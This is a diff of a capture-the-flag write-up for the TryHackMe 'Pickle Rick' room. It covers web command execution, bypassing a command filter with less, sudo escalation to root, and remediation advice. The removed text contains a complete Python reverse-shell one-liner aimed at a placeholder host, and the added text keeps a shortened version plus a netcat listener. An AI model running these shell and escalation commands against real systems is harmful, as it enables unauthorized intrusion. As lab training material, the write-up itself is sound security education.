@@ -1,4 +1,37 @@
-# 🖥️ Pickle Rick CTF — Complete Writeup
+<div align="center">
+
+## 🎪 Pickle Rick: A CTF Adventure
+
+![Badge](https://img.shields.io/badge/TryHackMe-Pickle%20Rick-ff6b00?style=for-the-badge&logo=tryhackme&logoColor=white)
+![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
+![Category](https://img.shields.io/badge/Category-Web%20Exploitation%20--%20CTF-blue?style=for-the-badge)
+
+### 🚀 Challenge Objective
+
+*Transform Rick back from a pickle by discovering three secret ingredients hidden within a vulnerable web application!*
+
+---
+
+### ⚡ Key Techniques & Vulnerabilities Demonstrated
+
+```
+┌─────────────────────────────────────────┐
+│  ✓ Directory Brute-Forcing              │
+│  ✓ Source Code Analysis                 │
+│  ✓ Authentication Bypass                │
+│  ✓ Remote Command Execution (RCE)       │
+│  ✓ Command Filtering Bypass             │
+│  ✓ File System Traversal                │
+│  ✓ Privilege Escalation (Sudo)          │
+│  ✓ Reverse Shell Acquisition            │
+└─────────────────────────────────────────┘
+```
+
+</div>
+
+---
+
+# 🖥️ Complete Step-by-Step Walkthrough
 
 > *A Rick and Morty-themed capture-the-flag challenge. Transform Rick back from a pickle by finding three secret ingredients!*
 
@@ -16,7 +49,7 @@ After obtaining the target IP address, I opened it in a browser and discovered t
 - 🔍 Performed directory brute-forcing to uncover hidden endpoints and clues
 - 📄 Inspected the page source code for hidden comments and credentials
 
-#### 🔐 Username Discovery
+#### �� Username Discovery
 
 Examining the HTML source code revealed a helpful comment:
 
@@ -345,7 +378,7 @@ sudo -i
 
 ✅ **Success:** Transitioned to root shell (`root@ip-10-48-164-33:#`)
 
-### 🏆 Final Ingredient Retrieval
+### �� Final Ingredient Retrieval
 
 With root access, accessing the final ingredient file:
 
@@ -357,198 +390,177 @@ cat /root/3rd.txt
 
 ---
 
-Now after accessing the file clue.txt By the url
+## 📚 Key Learnings & Attack Chain Summary
 
-http://IP/clue.txt
+### 🎓 Vulnerabilities Exploited
 
-And the content inside it was 
+| # | Vulnerability | Impact | Severity |
+|---|---|---|---|
+| 1️⃣ | Hardcoded Credentials (robots.txt) | Direct Authentication Bypass | 🔴 Critical |
+| 2️⃣ | Remote Command Execution (RCE) | Arbitrary Code Execution | �� Critical |
+| 3️⃣ | Insufficient Output Filtering | Command Execution Bypass | 🟠 High |
+| 4️⃣ | Weak File Permissions | Unauthorized File Access | 🟠 High |
+| 5️⃣ | Overly Permissive Sudo | Privilege Escalation | 🔴 Critical |
 
-```text
-Look around the file system for the other ingredient.
+### 🔄 Attack Flow Visualization
+
+```
+┌──────────────────┐
+│  Initial Recon   │  (Homepage enumeration + Source code analysis)
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  Directory Scan  │  (robots.txt → password found)
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  Authenticate    │  (Username: R1ckRul3s | Password: Wubbalubbadubdub)
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  RCE Discovery   │  (/portal.php endpoint for command execution)
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  Filter Bypass   │  (less command alternative to cat)
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  File Exfil #1   │  (First ingredient via direct URL access)
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  File System Nav │  (Traversal to /home/rick/)
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  File Exfil #2   │  (Second ingredient from /home/rick/second\ ingredients)
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  Reverse Shell   │  (Python payload for interactive access)
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  Privilege Esc.  │  (sudo su → root shell)
+└────────┬─────────┘
+         │
+         ▼
+┌──────────────────┐
+│  File Exfil #3   │  (Third ingredient from /root/3rd.txt)
+└──────────────────┘
 ```
 
-So i tried looking around after opening the page denied.php i got
+### 💡 Key Insights
 
-![denied.php](rick.png)
+**1. Defense in Depth Failures:**
+- Multiple layers of security were compromised through poor configuration
+- Weak credentials + RCE vulnerability = Complete system compromise
+- Overly permissive sudo rules eliminated the need for SUID exploitation
 
-Now after a lot of here and there on the server when i was on the portal endpoint everytime i used cat,vim or nano. i was getting the error
+**2. Important Command Filtering Bypass Techniques:**
+- Identify blocked commands early (`cat`, `vim`, `nano`)
+- Enumerate available alternatives (`less`, `head`, `tail`, `strings`)
+- Test alternatives before proceeding
 
-![rick.png](rick.png)
+**3. File System Traversal Without cd:**
+- Use absolute paths with commands: `ls -la /path/to/directory`
+- Can bypass `cd` restrictions through this method
+- Effective for accessing protected directories from restricted shells
 
-So i tried executing what program is actuallly installed on that system with the command 
+**4. Privilege Escalation Windows:**
+- Always check `sudo -l` for dangerous configurations
+- `(ALL : ALL) ALL` is extremely dangerous — allows root command execution
+- Even without specific SUID binaries, full sudo access guarantees root
 
-ls /usr/bin
+### 🛡️ Remediation Recommendations
 
-And i was able to get a lot of entries in which cat was also there i fed the entire list to ai and said to spot that prgram that is able to read the content of a file.
+For system administrators protecting against similar attacks:
 
-It spot the less command.
+```markdown
+✅ FIXES TO IMPLEMENT:
 
-which was successfullly reading the content of the file.
+1. Secure Credential Management
+   - Never hardcode credentials in robots.txt or comments
+   - Use environment variables or secure vaults
+   - Remove verbose comments from HTML/code
 
-which i tested for the file 
+2. Input Validation & Output Filtering
+   - Implement comprehensive command filtering/whitelisting
+   - Use parameterized execution instead of shell commands
+   - Escape special characters and dangerous keywords
 
-less clue.txt
+3. Principle of Least Privilege
+   - Restrict sudo access granularly
+   - Avoid (ALL : ALL) ALL configurations
+   - Use role-based access control (RBAC)
 
-And i get succeed in readig the content you can view the poc below
+4. File Permissions
+   - Ensure sensitive directories have restrictive permissions
+   - Home directories should not be writable by web server
+   - Regular audits of permission configurations
 
-![poc.png](poc.png)
-
-now we can walk around in the filesystem and be able to read anyfile as per our wish.
-
-but when i did finding which directory i am in since id  was www-data
-
-so obviuls i should be inside /var/html/www
-
-And our assumption was correct as i did pwd.
-
-And then to seach around in filesystem i tried to change the directroy to the root with cd /
-
-But after execuring it when i checked pwd i was still at /var/html/www
-
-Meaninng the cd was disabled too as like the cat.
-
-But since we can't go there but we could peek there.
-
-so i tried to peek inside with the command 
-
-ls  -lah /
-
-And i was able to read the content.
-
-
-so i tried to go more deep i peek inside the /home there was a folder rick so  i entered there too there was a file named second ingredients
-
-so i tried reading the file with 
-
-less /home/rick/second\ ingredients
-
-And i was able to get the answer of 2nd quesiton.
-
-
-For the 3rd question i need to go on to the rev shell or somehow get the shell.
-
-So now its time to go into the full detective mode and full roaming here and there now i did first few command command and gets the output
-
-- id > uid=33(www-data) gid=33(www-data) groups=33(www-data)
-
-- whoami > www-data
-
-- hostname > ip-10-48-164-33
-
-- uname -a > Linux ip-10-48-164-33 5.15.0-1064-aws #70~20.04.1-Ubuntu SMP Fri Jun 14 15:42:13 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
-
-- cat /etc/passwd  >root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
-systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
-systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-syslog:x:104:108::/home/syslog:/bin/false
-_apt:x:105:65534::/nonexistent:/bin/false
-lxd:x:106:65534::/var/lib/lxd/:/bin/false
-messagebus:x:107:111::/var/run/dbus:/bin/false
-uuidd:x:108:112::/run/uuidd:/bin/false
-dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
-sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
-pollinate:x:111:1::/var/cache/pollinate:/bin/false
-ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
-landscape:x:103:105::/var/lib/landscape:/usr/sbin/nologin
-tss:x:112:119:TPM software stack,,,:/var/lib/tpm:/bin/false
-tcpdump:x:113:120::/nonexistent:/usr/sbin/nologin
-fwupd-refresh:x:114:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-
-- cat /etc/crontab > # |  |  |  |  |
-# *  *  *  *  * user-name command to be executed
-17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
-25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
-47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
-52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-#
-
-These are the few result now after analyzing the crontab it is nothing much of our interest.
-
-But after inspecting the file /etc/passwd
-
-We got confirm that there are 2 users one is ubuntu and one is rick.
-
-Next i checked that at which location i am peremitted to write with the command
-
-- find / -writable -type d 2>/dev/null
-
-and the ouput was 
-
-```bash
-/proc/1482/task/1482/fd
-/proc/1482/fd
-/proc/1482/map_files
-/tmp
-/var/cache/apache2/mod_cache_disk
-/var/crash
-/var/tmp
-/var/lib/lxcfs/proc
-/var/lib/lxcfs/sys
-/var/lib/lxcfs/sys/devices
-/var/lib/lxcfs/sys/devices/system
-/var/lib/lxcfs/sys/devices/system/cpu
-/var/lib/lxcfs/cgroup
-/var/lib/php/sessions
-/run/screen
-/run/php
-/run/cloud-init/tmp
-/run/lock
-/run/lock/apache2
-/home/rick
-/dev/mqueue
-/dev/shm
+5. Web Application Hardening
+   - Disable/remove unnecessary file access endpoints
+   - Implement proper authentication and authorization
+   - Use security headers and CSP policies
 ```
 
-Interested locations were /tmp & /dev/shm
+---
 
+## ✨ Additional Resources & Tools Used
 
-And inside the location /home/rick there was only 1 file that contained the answer of q2.
+### 📖 Tools Employed
 
-And after it all with the commadn
+| Tool | Purpose | Command Example |
+|---|---|---|
+| **Gobuster** / **Dirb** | Directory Brute-Forcing | `gobuster dir -u http://target -w wordlist.txt` |
+| **curl** | Direct URL Access | `curl http://target/file.txt` |
+| **nc** / **Netcat** | Reverse Shell Listener | `nc -lvnp 4444` |
+| **Python3** | Reverse Shell Payload | `python3 -c 'import socket,os,pty...'` |
+| **less** | File Reading (Bypass) | `less /path/to/file` |
+| **sudo** | Privilege Escalation | `sudo su` → root shell |
 
-```bash
-python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR-IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+### 🎯 Lessons for Aspiring Security Professionals
+
+1. **Enumeration is Key** — Thorough reconnaissance reveals configuration weaknesses
+2. **Think Creatively** — When direct approaches fail, find alternative tools/methods
+3. **Privilege Escalation Chain** — RCE + Weak Perms = Full Compromise
+4. **Defense in Depth Matters** — Single failures at each layer compound into total compromise
+
+---
+
+## 🎬 Room Statistics
+
+```
+Room Name:          Pickle Rick
+Category:           CTF / Web Exploitation
+Difficulty:         🟢 Easy
+Time to Complete:   ~45-60 minutes
+Techniques:         7+ Attack Vectors
+Ingredients Found:  3️⃣ (100% Completion)
+Status:             ✅ PWNED!
 ```
 
-I was able to get the revshell.
+---
 
-Intentinally or unintenally i was chekcing for misconfigured binaries with sudo -l and it doesn't gave me any such binary so i tried anything else that is
+<div align="center">
 
-- sudo su
+### 🚀 Keep Hacking, Keep Learning!
 
-Now after it i somehow got the root access.
+![Badge](https://img.shields.io/badge/CTF-Completed-brightgreen?style=for-the-badge)
+![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-ff6b00?style=for-the-badge)
+![Ethical Hacking](https://img.shields.io/badge/Ethical-Hacking-blue?style=for-the-badge)
 
-After doing a little research i heard that if content after the execution of command sudo -l is
+*Remember: Always practice on authorized systems. Unauthorized hacking is illegal.* 🛡️
 
-Matching Defaults entries for root on ip-10-48-164-33: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User root may run the following commands on ip-10-48-164-33: (ALL : ALL) ALL
-
-Then if i am authenticated as that account (or already are root), I can get an interactive root shell with either:
-
-sudo su
-
-or:
-
-sudo -i
-
-Now after getting the root access i am able to read the 3rd question answer in the file
-
-/root/3rd.txt
+</div>
